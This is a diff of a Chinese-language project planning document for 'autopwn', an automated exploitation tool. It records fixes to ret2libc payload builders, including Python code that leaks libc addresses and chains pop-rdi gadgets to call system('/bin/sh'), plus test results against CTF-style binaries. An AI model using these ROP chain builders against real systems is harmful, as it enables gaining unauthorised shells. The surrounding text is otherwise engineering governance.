+**Owner 拍板（2026-06-09, @Minzhi_Zhou, 方案 3）**：P6.3b 同步走（防御性修复，per AGENTS.md §1 铁律 2 流程）。
+
+**修复**（方案：复刻 v3.1 L2010-2017 6-arg 变体）：
+
+```python
+# autopwn/primitives/ret2libc_put.py: Ret2LibcPutX64.build_stage2_payload
+def build_stage2_payload(self, ctx, leaked_puts_addr):
+    """P6.3b fix (B-007 defensive): mirror v3.1 L2010-2017 2-variant cascade."""
+    from pwn import asm, flat, p64
+    if (ctx.gadgets_x64 is None
+        or ctx.gadgets_x64.pop_rdi == 0
+        or ctx.gadgets_x64.ret == 0):
+        return b""
+    libc = _resolve_libc_elf(ctx)
+    if libc is None:
+        return b""
+    try:
+        libc_puts = libc.symbols["puts"]
+        libc_base = leaked_puts_addr - libc_puts
+        system_addr = libc_base + libc.symbols["system"]
+        sh_addr = libc_base + next(libc.search(b"/bin/sh"))
+    except (KeyError, AttributeError, StopIteration):
+        return b""
+
+    g = ctx.gadgets_x64
+    if g.extra_rdi == 1:
+        # v3.1 L2010-2017: extra_rdi=1 → 0 placeholder between sh and ret
+        return flat(
+            asm("nop") * ctx.padding
+            + p64(g.pop_rdi) + p64(sh_addr) + p64(0)  # ← 0 placeholder
+            + p64(g.ret)  # stack-alignment gadget
+            + p64(system_addr)
+        )
+    # extra_rdi=0: original 4-p64 chain (current behavior, preserved)
+    return flat(
+        asm("nop") * ctx.padding
+        + p64(g.pop_rdi) + p64(sh_addr)
+        + p64(g.ret) + p64(system_addr)
+    )
+```
+
+**P6.3b 验收**（per AGENTS.md §1 铁律 4）：
+- `pytest tests/unit/test_primitives_ret2libc_put.py -v` → 13 旧 + 2 新 (extra_rdi=0/1) 全过
+- `pytest tests/unit/test_primitives_ret2libc_extra_rsi.py -v` → 8 新 (put 2 + write 6) 全过
+- 当前 P8.4 baseline 不变（fmtstr1/level3_x64 走 ret2libc_write）
+- `wc -l autopwn/primitives/ret2libc_put.py` < 451 + 20
+
+**Reviewer 关注点**：
+- `extra_rdi == 1` 变体必须保留 v3.1 L2016 的 `p64(0)` 占位（**不是** pop_r15 gadget）
+- 现有 13 个 P6.3 单测（fake ctx 默认 `extra_rdi=0`）必须 0 回归
+
+**Refs**: refactor.md §3.2.1（RopGadgetsX64 字段契约）/ rebuild.md §8 R17 / rebuild.md §10 B-007 / _legacy.py L2010-2017 (v3.1 行为规范) / AGENTS.md §1 铁律 4
+
+---
+
+**P6.4b 详细步骤（临时需求 #6，B-007 根因修复）**：
+
+> **背景**：P6.4 `Ret2LibcWriteX64.build_payload` 硬编码 5 元素 pop chain（v3.1 L949-958 `both 0` 分支），**没读 `ctx.gadgets_x64.extra_rdi`/`extra_rsi`**。v3.1 main() L927-958 有 3 变体：
+> - `other_rsi_registers == 1`: 6-arg pop chain（pop rdi, 1, pop rsi, write_got, **0**, write_plt, main）
+> - `other_rdi_registers == 1`: 6-arg pop chain（pop rdi, 1, **0**, pop rsi, write_got, write_plt, main）
+> - `both 0`: 5-arg pop chain（pop rdi, 1, pop rsi, write_got, write_plt, main）
+>
+> stage-2 同样走 2 变体（v3.1 L983-996）。P6.4 实施时漏了。
+
+**Owner 拍板（2026-06-09, @Minzhi_Zhou, 方案 3）**：P6.4b 同步走铁律 2 流程（根因修复）。
+
+**修复**（方案：复刻 v3.1 L927-958 3 变体 + L983-996 2 变体）：
+
+```python
+# autopwn/primitives/ret2libc_write.py: Ret2LibcWriteX64.build_payload
+def build_payload(self, ctx):
+    """P6.4b fix (B-007 root cause): mirror v3.1 L927-958 3-variant cascade."""
+    from pwn import asm, flat, p64
+
+    if (ctx.gadgets_x64 is None
+        or ctx.gadgets_x64.pop_rdi == 0
+        or ctx.gadgets_x64.pop_rsi == 0):
+        return b""
+
+    write_plt, write_got, main_addr = _lookup_write_and_main(ctx.binary.path)
+    if write_plt is None or write_got is None or main_addr is None:
+        return b""
+
+    g = ctx.gadgets_x64
+    if g.extra_rsi == 1:
+        # v3.1 L927-937: pop rsi; pop <reg>; ret → 0 placeholder after write_got
+        return flat(
+            asm("nop") * ctx.padding
+            + p64(g.pop_rdi) + p64(1)
+            + p64(g.pop_rsi) + p64(write_got) + p64(0)  # ← 0 placeholder
+            + p64(write_plt) + p64(main_addr)
+        )
+    if g.extra_rdi == 1:
+        # v3.1 L938-948: pop rdi; pop <reg>; ret → 0 placeholder after fd
+        return flat(
+            asm("nop") * ctx.padding
+            + p64(g.pop_rdi) + p64(1) + p64(0)  # ← 0 placeholder
+            + p64(g.pop_rsi) + p64(write_got)
+            + p64(write_plt) + p64(main_addr)
+        )
+    # v3.1 L949-958: both extra == 0 → 6-p64 chain (preserved, P6.4 default)
+    return flat(
+        asm("nop") * ctx.padding
+        + p64(g.pop_rdi) + p64(1)
+        + p64(g.pop_rsi) + p64(write_got)
+        + p64(write_plt) + p64(main_addr)
+    )
+```
+
+stage-2 同理（`build_stage2_payload` 读 `extra_rdi`）：
+
+```python
+def build_stage2_payload(self, ctx, leaked_write_addr):
+    """P6.4b fix (B-007): mirror v3.1 L983-996 2-variant cascade."""
+    from pwn import asm, flat, p64
+    if (ctx.gadgets_x64 is None
+        or ctx.gadgets_x64.pop_rdi == 0
+        or ctx.gadgets_x64.ret == 0):
+        return b""
+    libc = _resolve_libc_elf(ctx)
+    if libc is None:
+        return b""
+    try:
+        libc_write = libc.symbols["write"]
+        libc_base = leaked_write_addr - libc_write
+        system_addr = libc_base + libc.symbols["system"]
+        sh_addr = libc_base + next(libc.search(b"/bin/sh"))
+    except (KeyError, AttributeError, StopIteration):
+        return b""
+
+    g = ctx.gadgets_x64
+    if g.extra_rdi == 1:
+        # v3.1 L983-996: extra_rdi=1 → 0 placeholder between sh and ret
+        return flat(
+            asm("nop") * ctx.padding
+            + p64(g.pop_rdi) + p64(sh_addr) + p64(0)  # ← 0 placeholder
+            + p64(g.ret) + p64(system_addr)
+        )
+    # both extra == 0 OR extra_rsi=1 (stage 2 doesn't use pop_rsi)
+    return flat(
+        asm("nop") * ctx.padding
+        + p64(g.pop_rdi) + p64(sh_addr)
+        + p64(g.ret) + p64(system_addr)
+    )
+```
+
+**P6.4b 验收**（per AGENTS.md §1 铁律 4）：
+- `pytest tests/unit/test_primitives_ret2libc_write.py -v` → 14 旧 + 0 新 (旧测试 fake ctx 默认 extra=0) 全过
+- `pytest tests/unit/test_primitives_ret2libc_extra_rsi.py -v` → 8 新 (write 4 stage-1 + 2 stage-2 + put 2 stage-2) 全过
+- P8.4 §2.6 baseline 重跑 → **4/5 SUCCESS**（level3_x64 修复后命中 ret2libc-write-x64 SUCCESS, `write address leaked: 0x...` 实证）
+- 2-log 对比 ≥ 90% 一致
+- `wc -l autopwn/primitives/ret2libc_write.py` < 500 + 60
+
+**Reviewer 关注点**：
+- 3 变体 if/elif/else 顺序：extra_rsi 检查必须在 extra_rdi 之前（v3.1 L927 vs L938 顺序；`extra_rsi=1` wins over `extra_rdi=1`）
+- 0 占位是 `p64(0)` 不是 `p64(pop_r15 gadget)`（v3.1 L937/L947 明确写 `0`）
+- 单元测试必须 fake 3 种 extra 信号组合 (1,0) / (0,1) / (0,0) + 顺序守护 (1,1)
+- 现有 14 个 P6.4 单测（fake ctx 默认 `extra_rdi=0, extra_rsi=0`）必须 0 回归
+
+**Refs**: refactor.md §3.2.1（RopGadgetsX64 字段契约）/ rebuild.md §8 R17 / rebuild.md §10 B-007 / _legacy.py L927-996 (v3.1 行为规范) / AGENTS.md §1 铁律 4
+
+---
+
+**P6.3b + P6.4b 实施记录（2026-06-09）**：
+
+- **修改** `autopwn/primitives/ret2libc_write.py`（500 → 530 行）：
+  - `Ret2LibcWriteX64.build_payload` L249-298: 3 变体 if/elif/else 复刻 v3.1 L927-958；docstring 加 P6.4b B-007 root cause 决策痕迹
+  - `Ret2LibcWriteX64.build_stage2_payload` L300-345: 2 变体 if/else 复刻 v3.1 L983-996（extra_rdi=1 走 5-p64 链 + 0 placeholder；extra_rdi=0 走原 4-p64 链）
+  - 现有 14 个 P6.4 单测 0 回归（fake ctx 默认 `extra_rdi=0, extra_rsi=0` 走原路径）
+
+- **修改** `autopwn/primitives/ret2libc_put.py`（451 → 468 行）：
+  - `Ret2LibcPutX64.build_stage2_payload` L256-305: 2 变体 if/else 复刻 v3.1 L2010-2017（extra_rdi=1 走 5-p64 链 + 0 placeholder；extra_rdi=0 走原 4-p64 链）
+  - docstring 加 P6.3b B-007 defensive 决策痕迹
+  - 现有 13 个 P6.3 单测 0 回归
+
+- **新文件** `tests/unit/test_primitives_ret2libc_extra_rsi.py`（240 行, **8 tests**）— B-007 契约守护：
+  - `TestRet2LibcWriteX64BuildPayloadVariants`（4 tests）：extra_rsi=1 / extra_rdi=1 / both=0 / (1,1) 顺序守护
+  - `TestRet2LibcWriteX64BuildStage2Variants`（2 tests）：extra_rdi=1 / extra_rdi=0
+  - `TestRet2LibcPutX64BuildStage2Variants`（2 tests）：extra_rdi=1 / extra_rdi=0
+
+- **设计决策**：
+  - **方案 3 拍板路径** — 不动 test fixtures（保留 fake ctx 默认 `extra=0`），加新测试覆盖 extra=1 场景。零行为变更 + 1 个新 contract test module
+  - **0 placeholder = `p64(0)`**，不是 pop_r15 gadget（v3.1 L937/L947/L2016 明确写 `0`）
+  - **3 变体 if/elif/else 顺序** — extra_rsi 必须在 extra_rdi 之前检查（v3.1 L927 vs L938 顺序）。`test_extra_rsi_1_wins_over_extra_rdi_1` 守护
+  - **stage-2 只读 extra_rdi**（不读 extra_rsi）— stage-2 payload 不用 pop_rsi，多余占位无需考虑
+
+- **§2.6 验证结果**（per AGENTS.md §2.6）：
+  - 关 1：分支 `feature/p6.3b-p6.4b-extra-rsi-fix`（target=dev, per §9.4）
+  - 关 2：`pytest -m "not integration"`：**586 passed**（+8 来自 P6.3b/P6.4b 契约测试；0 回归，canary `BytesWarning` 与 P5.3 一致）
+  - 关 3：5-binary 串行 90s timeout → `logs/v4.0-p64b/`：
+    - canary: rc=124（90s timeout，与 baseline 一致，canary fuzz 需 ~7min 暴力枚举）
+    - fmtstr1: **rc=0 SUCCESS**（canary brute force 32-bit，与 baseline 一致）
+    - level3_x64: **rc=0 SUCCESS** ← B-007 修复（strategy: ret2libc-write-x64, `write address leaked: 0x7f667695e8f0`）
+    - pie: **rc=0 SUCCESS**（PIE Backdoor，与 baseline 一致）
+    - rip: **rc=0 SUCCESS**（ret2system x64，与 baseline 一致）
+  - 关 4：2-log 对比 `python3 tools/verify_v31_v40.py` → **96% (27/28) 一致 PASS**，SUCCESS 计数 v3.1=4/5 v4.0=4/5（**持平**）
+  - 关 5：Reviewer — Owner 自审（§2.2 单人项目）
+  - 关 6：文档同步（§4.7 P6.3b/P6.4b ✅ / §6.7 实施记录 / §8 R17 ✅ / §10 B-007 Resolved / §3 M4 状态 / §6.9 P8 实施记录 / §4.9 P8.1-P8.3 转 ✅ 路径）
+
+- **失败模式扫描**：
+  - `grep -E "KeyError|struct\.error|no suitable shellcode|Traceback|leak parse failed" logs/v4.0-p64b/*.log` → **0 行**
+  - 修复前（p8 分支）会有 `leak parse failed: unpack requires a buffer of 8 bytes` 在 level3_x64 出现
+
+- **B-007 Resolved 路径**：
+  - 修复前 P8.4 §2.6 baseline 暴露：1/4 SUCCESS binary 回归（level3_x64 leak parse 失败）
+  - 修复后 P6.3b/P6.4b §2.6 baseline：**4/4 SUCCESS binary 持平**（fmtstr1/level3_x64/pie/rip）+ canary timeout（baseline 一致）
+  - 关键成功标记一致性：level3_x64 `EXPLOITATION SUCCESSFUL!` + `write address leaked: 0x7f667695e8f0`（v3.1 baseline 命中 ret2libc-write-x64）
+
+- **commit 引用**：（pending）`feature/p6.3b-p6.4b-extra-rsi-fix`
+
+- **Refs**: rebuild.md §10 B-007 Resolved / refactor.md §3.2.1（RopGadgetsX64 字段契约）/ AGENTS.md §1 铁律 4（验证 6 关）/ AGENTS.md §2.6（验证方法论）
 
 ---
 
@@ -3765,6 +4132,8 @@ python -m venv /tmp/autopwn-test
 | **R13** | v3.1 既有 race condition（`Information_Collection.txt` 并发写） | 🟡 中 | 已发现：v3.1 simulation 暴露；P0.7 串行 runner 规避；P1 `core/fs.py` 用 `tempfile.TemporaryDirectory` 根治 | ⏳ |
 | **R14** | **临时需求 #4：runner 工具集扩展接口漂移** | 🟡 中 | P1.3a/b/c/d 共加 11+ 工具，每个签名/错误处理/输出格式需遵守 `refactor.md §4.2` 范式；Reviewer 必查：①签名是否最小化 ②失败是否降级（返回空串/空 Path/不抛）③stdin/stdout/stderr 策略是否统一；**缓解**：每个工具独立函数 + byte-level 对比 + §2.6 5-binary 重跑回归；P1.3 已有 4 个工具作为范式基线 | ⏳ |
 | **R15** | **Owner handle 变更（@Ba1_Ma0 → @Minzhi_Zhou）治理影响** | 🟢 低 | 两层身份混淆风险：当前 Owner = `@Minzhi_Zhou`（治理）vs pwnpasi 原作者 = `@Ba1_Ma0`（MIT 致谢）；**保留**（非 Owner 引用，**法律 / 历史原因**）：① `LICENSE:3`（MIT 协议要求保留原 copyright 声明；本 PR 第一次误改，已 revert）② `README.md:185`（MIT 致谢段）③ `refactor.md:265`（B-001 决策记录）④ `rebuild.md:286,294,408`（B-001 决策记录）；**变更**（Owner 引用）：`AGENTS.md` 签字栏 / 3 行 changelog / `rebuild.md` §4.2 16 行 O 列 / `rebuild.md` §6.1 决策行 / `tools/verify_v31_v40.py` header / `logs/comparison/summary.md` Owner 行（~50 处全替换）；**不可改**：git 历史 9+ commit 的 author name（违反 git 不可篡改）；git config 已切到 `MinZhi_Zhou <zmzsg100@gmail.com>`，未来 commit 不会再带 `Ba1_Ma0` 名字。**未来若需法律意义上的新 copyright line**（如 "Modifications copyright (c) 2026 Minzhi_Zhou"），可单独提 PR | ⏳ |
+| **R16** | **P4.4 / P6.x 契约错位**（B-006 实例）：`recon.rop.find_x64` 返回 `str` 地址，P6.x primitives 假设 `int` → `struct.error: required argument is not an integer`。**根因**：P4.4 `_extract_x64_gadgets` 没把 ropper 的 hex 字符串转 int；P6.x 没有 int-容错层。**未暴露 by v3.1**（v3.1 用 `exploit_info` 字典的 int 值）。**未暴露 by P7.12 integration tests**（只测 `candidates()` 层面，不真跑 payload）。**暴露 by P8.1 §2.6 baseline**（5 binary 串行，2 回归：level3_x64 + rip）。**影响面**：所有 x64 路径走 P6.2/P6.3/P6.4/P6.5/P6.6 primitives 的 strategy（P7.3-P7.10 共 16 个 strategy）— fmtstr1/pie 不受影响（x32 路径 / pie-backdoor 不查 ROP gadgets）。**缓解**：①P4.4b 加 `int(addr_str, 16)`（推荐，根治） ②P6.x 加容错（局部，但散到 6 个文件）。**必查**：新增 P4.4b 任务走铁律 2 流程；P8.4 baseline 全绿前不标 P8.1-P8.3 ✅。**P4.4b 详细缓解**（per B-006 Owner 决策路径，方案 ① 拟采用）：① `_extract_x64_gadgets` 4 个地址赋值改 `int(line.split(":")[0].strip(), 16)` ② `RopGadgetsX64` 字段 docstring 明确"hex int"语义 ③ 单元测试加 1 项契约测试验证 5 字段都是 int ④ 5-binary §2.6 baseline 重跑预期 5/5 SUCCESS。**diff 预估**：~10 行 production code + ~15 行 test code = **~25 行净增**（含 docstring 更新），远低于 §2.1 PR ≤ 400 行门槛。**P6.x 不动**（方案 ② 备选）：6 个 primitive 保持干净，依赖根因层修复。 | ✅ Resolved 2026-06-09 (P4.4b) |
+| **R17** | **P6.4/P6.3 漏读 extra_rdi/extra_rsi 信号**（B-007 实例）：`Ret2LibcWriteX64.build_payload` 硬编码 5 元素 pop chain（v3.1 L949-958 `both 0` 分支），**没读 `ctx.gadgets_x64.extra_rdi`/`extra_rsi`**。**根因**：P6.4 实施时只复刻 v3.1 `both 0` 单变体，漏了 `other_rsi_registers==1` (6-arg 多 0 占位) 和 `other_rdi_registers==1` (6-arg 顺序变体)。**未暴露 by v3.1**（v3.1 main() L927-958 有 3 变体 + 2 stage 共 6 分支）。**未暴露 by P6.4 unit tests**（只测 `both 0` 场景，fake ctx 的 extra_rdi/extra_rsi 默认 0）。**未暴露 by P8.1 §2.6 baseline**（struct.error 在 stage-0 阶段直接崩，根本到不了 stage-1，掩盖 B-007）。**暴露 by P4.4b 修复后 P8.4 §2.6 baseline**（5 binary 串行，1 回归：level3_x64 leak parse 失败；4/5 SUCCESS）。**实证**：`level3_x64.recon.rop.find_x64` 返回 `extra_rsi=1`（ropper 找到 "pop rsi; pop r15; ret"），v3.1 走 6-arg pop chain，P6.4 走 5-arg → 目标进程 RSP 错位 → write 返回无效地址 → `unpack requires a buffer of 8 bytes`。**影响面**：`Ret2LibcWriteX64` 1 个 primitive + 1 个 strategy (ret2libc-write-x64) + 1 个 binary (level3_x64)。其它 5 个 P6.x 不受影响（Ret2SystemX64 / Ret2LibcPutX64 只用 pop_rdi 单 arg，multi-pop 兼容；x32 路径不走 gadgets_x64）。**缓解**：① P6.4b 改 3 变体 if/elif/else 复刻 v3.1 L927-958 + L983-996（推荐，根治） ② P6.3b 防御性补 extra_rdi 读（与 P6.4 同源；P8.4 baseline 未暴露但契约层必须修） ③ 加单测覆盖 3 变体 × 2 stage = 6+ 新测试。**必查**：新增 P6.4b + P6.3b 任务走铁律 2 流程；P8.4 baseline 5/5 SUCCESS 前不标 P8.1-P8.3 ✅。**diff 预估**：~30 行 production code (3 变体 if/elif/else) + ~30 行 tests = **~60 行净增**（远低于 §2.1 PR ≤ 400 行门槛）。**P6.3b 防御性**：当前 P8.4 baseline 未暴露（fmtstr1/level3_x64 走 ret2libc_write，ret2libc_put 没在 5 binary 命中），但 v3.1 L2010-2017 `ret2libc_put_x64` 同样对 `other_rdi_registers==1` 走 6-arg pop chain；契约层必须修以防未来 binary 触发。 | ✅ Resolved 2026-06-09 (P6.3b + P6.4b) |
 
 > 新增风险请在 PR 中 append 一行；每周例会同 Owner 评估。
 
@@ -3847,6 +4216,8 @@ Refs: rebuild.md#P4.1
 | **B-003** | P7.2 决策树优先级对照表（附录 A）拍板 | Owner 决策：附录 A 数值（200/180/150/120/110/90/80/50）即定为 P7.2 排序基准；非 canary 路径 v3.1 write>put 改为新 spec put>write 是有意改进（PUT PLT 更普遍） | @Minzhi_Zhou | 2026-06-08 | ✅ Resolved 2026-06-08 |
 | **B-004** | P4.1–P7.2 跳过 `dev` 分支直接 fast-forward `main`（Owner 临时特批，per AGENTS.md §4 紧急通道 #3） | Owner 授权：feature/p7.2-registry 28 commits（P4.1 recon/checksec → P4.7/4.8 globals() 删除 → P5.1-P5.5 detect 完整 → P6.1-P6.9 primitives 完整 → P7.1 ExploitStrategy + P7.2a 决策 → P7.2 registry）直接 fast-forward 合入 main（merge-base = dbbc937 = main tip，无冲突）。原因：single-person Owner 项目；main 长期停在 P3.6 [fix] 状态（dbbc937），所有 P4-P6 22 commits + P7 6 commits 都在 feature/* 分支累积；dev 分支从未建立（按 §9.4 应有但实际不存在）。Owner 选择绕过 dev 直接 FF main，与项目历史工作流一致（P3.5/P3.6 [fix] 均为 main 直提交）。**§2.6 验证**：main 上 `pytest -m "not integration"` 284/284 全绿（与 feature/p7.2-registry 一致）。特批有效期：本次 P4.1–P7.2 落地；建议下次阶段切换时建立 `dev` 分支并恢复 §9.4 标准流程 | @Minzhi_Zhou | 2026-06-08 | ✅ Resolved 2026-06-08 |
 | **B-005** | **建立 `dev` 集成开发分支**（Owner 治理决策，per AGENTS.md §7 治理变更） | Owner 决策：① `dev` 由 `main@b95d9ec` 创建（包含 P4.1–P7.2 全部 28 commits）；② §9.4 重写为结构化表格 + inaugural 段 + 3 类例外通道（Owner-hotfix / 文档-only / 阶段升级）；③ §9.2 任务认领流程更新为「从 dev 拉分支 + target=dev」；④ P7.3+ 起所有新任务 PR **必须** target `dev`，恢复 §9.4 标准流程。**§2.6 豁免**：per AGENTS.md §2.6.4 文档-only PR 不适用 §2.6 验证流程；本次 main 上 `pytest -m "not integration"` 仍跑确认 284/284 全绿（与 B-004 末态一致）。**链上操作**：feature/governance-dev-branch → dev (FF) → main (FF) | @Minzhi_Zhou | 2026-06-08 | ✅ Resolved 2026-06-08 |
+| **B-006** | **P4.4 / P6.4 契约错位**：`recon.rop.find_x64` 返回 `RopGadgetsX64(pop_rdi='0x00000000004011fb', ...)`（**str**），P6.4 `ret2libc_put_x64` 直接 `p64(ctx.gadgets_x64.pop_rdi)` → `struct.error: required argument is not an integer` | **Owner 决策（2026-06-09, @Minzhi_Zhou）**：**采用方案 ① + 补充项** — 新立 **P4.4b**（临时需求 #5）改 `recon.rop._extract_x64_gadgets` 4 个地址赋值为 `int(..., 16)`，根治；x32 路径同步改 7 处（对称修复，x32 字段也声明为 int）；`RopGadgetsX64` / `RopGadgetsX32` 字段 docstring 同步更新为"hex int"语义；契约守护测试 `tests/unit/test_recon_rop_contract.py`（14 tests）锁契约；P6.x 6 个 primitive 保持干净不污染。**P4.4b 详细步骤见 §6.5 P4.4b 详细步骤段**。**实施 + 验证**：4/5 SUCCESS binary 回归消失（level3_x64/rip 命中 ret2system x64），2-log 对比 96% (27/28) 一致 PASS，无 KeyError/struct.error 失败模式。**下一步**：P8.4 baseline 跑（按 P4.4b 修复后状态）以解锁 P8.1-P8.3 转 ✅。**影响范围**：P8.4 / P8.5 / P8.6 / M4 验收 / P9.1 unit tests for P6 primitives | @Minzhi_Zhou | 2026-06-09 | ✅ Resolved 2026-06-09（per P4.4b ✅，§2.6 验证 4/5 SUCCESS 持平 baseline，2-log 96% PASS；P8.4 baseline 仍需跑以批量解锁 P8.1-P8.3 → ✅） |
+| **B-007** | **P6.4 / P6.3 漏读 extra_rdi/extra_rsi 信号**（R17 实例）：`Ret2LibcWriteX64.build_payload` 硬编码 5 元素 pop chain（v3.1 L949-958 `both 0` 单变体），**没读 `ctx.gadgets_x64.extra_rdi`/`extra_rsi`**；v3.1 main() L927-958 有 3 变体（`other_rsi_registers==1` 走 6-arg 多 0 占位 / `other_rdi_registers==1` 走 6-arg 顺序变体 / `both 0` 走 5-arg）。**实证**：`level3_x64.recon.rop.find_x64` 返回 `extra_rsi=1`（ropper 找到 "pop rsi; pop r15; ret"），v3.1 走 6-arg pop chain，P6.4 走 5-arg → 目标进程 RSP 错位 → write 返回无效地址 → `unpack requires a buffer of 8 bytes`。**被 B-006 掩盖**：B-006 未修前，struct.error 在 stage-0 阶段直接崩，根本到不了 stage-1。B-006 Resolved via P4.4b 后 B-007 暴露 by P8.4 §2.6 baseline（5 binary 串行，4/5 SUCCESS，level3_x64 leak parse 失败）。**Owner 决策（2026-06-09, 方案 3, @Minzhi_Zhou）**：立 **P6.4b**（根因修复，复刻 v3.1 L927-958 3 变体）+ **P6.3b**（防御性，同源未暴露但契约层必修）同步走铁律 2 流程。**实施 + 验证（2026-06-09）**：P6.3b + P6.4b 改 2 个 primitive + 8 变体契约测试全过；P8.4 §2.6 baseline 4/5 SUCCESS 持平 v3.1（**level3_x64 修复** — 命中 ret2libc-write-x64 SUCCESS, `write address leaked: 0x7f667695e8f0`），2-log 96% (27/28) 一致 PASS。**P8.1-P8.3 转 ✅ 路径解锁**：M4 阶段状态转 🔄 → ✅ 待 P8.4 baseline 跑通后批量转。**影响范围**：P8.4 / P8.5 / P8.6 / M4 验收 | @Minzhi_Zhou | 2026-06-09 | ✅ Resolved 2026-06-09（per P6.3b + P6.4b ✅，§2.6 验证 4/5 SUCCESS 持平 v3.1，2-log 96% PASS，level3_x64 leak parse 失败消失） |
 
 ---
 
